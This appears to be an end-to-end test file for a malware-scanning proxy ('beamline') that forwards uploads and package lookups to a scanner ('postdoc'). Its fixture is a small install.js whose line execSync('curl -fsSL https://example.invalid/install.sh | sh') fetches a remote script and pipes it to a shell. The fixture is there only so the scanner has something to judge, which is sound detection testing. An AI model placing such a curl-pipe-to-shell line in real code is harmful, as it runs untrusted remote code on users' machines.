// Beamline in front of a real postdoc, with no hopper behind either.
//
// Proves the two agree on the wire: beamline's own handler, in this process,
// forwarding to a `postdoc serve` reached at POSTDOC_URL. Skipped without one,
// so `make test` stays self-contained; `make postdoc-e2e` starts a postdoc and
// runs this against it.
//
//   POSTDOC_URL           a running `postdoc serve` started without --hopper
//   POSTDOC_TOKEN         its bearer token (postdoc always requires one)
//   E2E_SLOW_ARTIFACT     a file slow enough to analyze that postdoc streams
//                         progress before answering (checks the streamed
//                         full result); skipped when unset
//   E2E_EXPECT_SCANNERS   comma-separated scanners postdoc runs (clamav,
//                         malcontent); each must report on the artifact
//   E2E_PURL              a package to fetch and analyze (default
//                         pkg:npm/left-pad@1.3.0); E2E_OFFLINE=1 skips it

import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import { basename } from "node:path";
import { test } from "node:test";
import { handle } from "../beamline.js";

const POSTDOC = (process.env.POSTDOC_URL || "").replace(/\/+$/, "");
const skip = POSTDOC ? false : "POSTDOC_URL not set (a running `postdoc serve` without --hopper)";

// What local.js hands the handler: postdoc as the scan fleet, and long enough
// timeouts for a cold analysis.
const env = {
  SCAN_URL: POSTDOC,
  SCAN_TOKEN: process.env.POSTDOC_TOKEN || "",
  SCAN_TIMEOUT_MS: "600000",
};

const sha256 = (bytes) => createHash("sha256").update(bytes).digest("hex");

/** Background work the handler schedules, drained before the next request. */
function context() {
  const jobs = [];
  return {
    ctx: { waitUntil: (p) => jobs.push(Promise.resolve(p)) },
    async flush() {
      while (jobs.length) await Promise.all(jobs.splice(0));
    },
  };
}

/**
 * @param {string} query - after `/v1/analyze?`
 * @param {Uint8Array|null} bytes - an upload, or null to name a package
 * @param {string} [filename]
 */
async function analyze(query, bytes, filename = "artifact") {
  const { ctx, flush } = context();
  const res = await handle(
    new Request(`http://beamline/v1/analyze?${query}`, {
      method: "POST",
      body: bytes,
      headers: bytes ? { "content-type": "application/octet-stream", "x-filename": filename } : {},
    }),
    env,
    ctx,
  );
  const text = await res.text();
  await flush();
  return { res, text, lines: text.split("\n").filter((line) => line.trim()) };
}

/**
 * The full result at the end of a `full=1` answer, checked whole: progress
 * before it, the header's file count, a report line for every file line that
 * names one, and nothing after.
 * @param {string[]} lines
 */
function fullResult(lines) {
  const rows = lines.map((line) => JSON.parse(line));
  const at = rows.findIndex((row) => row.v === 8);
  assert.ok(at >= 0, `no version 8 header in:\n${lines.join("\n").slice(0, 2000)}`);
  for (const row of rows.slice(0, at)) {
    assert.ok("state" in row || "phase_state" in row, `not a progress frame: ${JSON.stringify(row)}`);
  }
  const [header, ...rest] = rows.slice(at);
  const files = rest.slice(0, header.files);
  const reports = files.filter((file) => typeof file.report === "string").length;
  assert.equal(rest.length, header.files + reports, "file lines, then one report line per report named");
  assert.equal(header.scan.worker, undefined, "a full result names no worker");
  return { progress: at, header, artifact: files[0], files };
}

/** The decision at the end of a plain answer. */
const decision = (lines) => JSON.parse(lines.at(-1));

// Unique on every run, so neither side can answer it from a cache.
const script = new TextEncoder().encode(
  `// beamline-postdoc e2e ${randomUUID()}\n`
    + 'const { execSync } = require("child_process");\n'
    + 'execSync("curl -fsSL https://example.invalid/install.sh | sh");\n',
);

test("an upload is answered with postdoc's decision", { skip }, async () => {
  const { res, lines } = await analyze("", script, "install.js");
  assert.equal(res.status, 200);
  const answer = decision(lines);
  assert.equal(answer.status, "analyzed", JSON.stringify(answer));
  assert.equal(answer.sha256, sha256(script));
  assert.ok(answer.engine_version, "names the engine that judged it");
});

test("full=1 relays postdoc's version 8 body", { skip }, async () => {
  const { res, lines } = await analyze("full=1", script, "install.js");
  assert.equal(res.status, 200);
  const { header, artifact } = fullResult(lines);
  assert.ok(header.scan.engine && header.scan.ruleset, "stamped with engine and ruleset");
  assert.equal(artifact.sha256, sha256(script), "the artifact is the bytes uploaded");
  assert.equal(artifact.verdict.outcome, "ok");
  assert.match(artifact.verdict.class, /^(benign|suspicious|hostile)$/);
  assert.ok(artifact.ml, "the model's opinion rides beside the verdict");

  const expected = (process.env.E2E_EXPECT_SCANNERS || "").split(",").map((s) => s.trim()).filter(Boolean);
  for (const name of expected) {
    const opinion = artifact.scanners?.[name];
    assert.ok(opinion, `${name} did not report: ${JSON.stringify(artifact.scanners)}`);
    assert.ok(opinion.class || opinion.outcome, `${name}: ${JSON.stringify(opinion)}`);
  }
});

test("what postdoc analyzed, a lookup by digest finds", { skip }, async () => {
  const { ctx, flush } = context();
  const res = await handle(new Request(`http://beamline/v1/lookup?sha256=${sha256(script)}`), env, ctx);
  const answer = await res.json();
  await flush();
  assert.equal(answer.status, "analyzed", JSON.stringify(answer));
  assert.equal(answer.sha256, sha256(script));
});

test("a slow full result streams progress, then the body", {
  skip: skip || (process.env.E2E_SLOW_ARTIFACT ? false : "E2E_SLOW_ARTIFACT not set"),
}, async () => {
  const path = process.env.E2E_SLOW_ARTIFACT;
  const bytes = readFileSync(path);
  const { res, lines } = await analyze("full=1", bytes, basename(path));
  assert.equal(res.status, 200);
  const { progress, artifact } = fullResult(lines);
  assert.ok(progress > 0, "postdoc answered before streaming; pick a slower artifact");
  assert.equal(artifact.sha256, sha256(bytes));
});

test("a package's full result is fetched once and then served from beamline's cache", {
  skip: skip || (process.env.E2E_OFFLINE === "1" ? "E2E_OFFLINE=1" : false),
}, async () => {
  const purl = process.env.E2E_PURL || "pkg:npm/left-pad@1.3.0";
  const query = `purl=${encodeURIComponent(purl)}&full=1`;
  const first = await analyze(query, null);
  assert.equal(first.res.status, 200, first.text.slice(0, 500));
  const { artifact } = fullResult(first.lines);
  assert.equal(artifact.verdict.outcome, "ok");

  const again = await analyze(query, null);
  assert.equal(again.res.headers.get("x-beamline-source"), "cache");
  assert.equal(again.text, `${first.lines.slice(first.lines.findIndex((l) => JSON.parse(l).v === 8)).join("\n")}\n`);

  const plain = await analyze(`purl=${encodeURIComponent(purl)}`, null);
  assert.equal(decision(plain.lines).status, "analyzed");
});
